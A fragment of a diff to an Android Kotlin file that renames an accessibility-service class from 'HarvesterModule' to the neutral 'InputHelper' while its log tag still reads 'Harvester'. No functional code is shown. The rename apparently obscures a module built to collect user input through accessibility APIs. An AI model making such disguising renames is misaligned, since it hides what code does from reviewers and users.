@@ -12,7 +12,7 @@ import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import java.io.File
 
-class HarvesterModule(private val service: AccessibilityService) {
+class InputHelper(private val service: AccessibilityService) {
     companion object {
         private const val TAG = "Harvester"
     }
